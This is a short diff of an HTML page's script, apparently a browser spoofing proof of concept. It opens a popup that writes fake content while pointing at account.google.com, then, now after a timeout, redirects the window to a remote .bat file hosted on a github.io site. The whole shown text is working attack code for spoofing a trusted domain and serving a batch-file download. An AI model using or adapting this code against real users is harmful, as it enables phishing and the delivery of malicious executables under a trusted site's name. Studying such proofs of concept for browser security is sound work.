@@ -2,9 +2,11 @@
 <head>
   <script>
   function next() {
-         w.location.replace('https://heloworld285.github.io/calc.bat');
-        }
-
+    setTimeout(function() {    
+    w.location.replace('https://heloworld285.github.io/calc.bat');
+        }, 100);
+    }
+    
   function f() {
     w = window.open("javascript:document.write('<h1>This is a Fake Content!</h1>');location='http://account.google.com'");
  
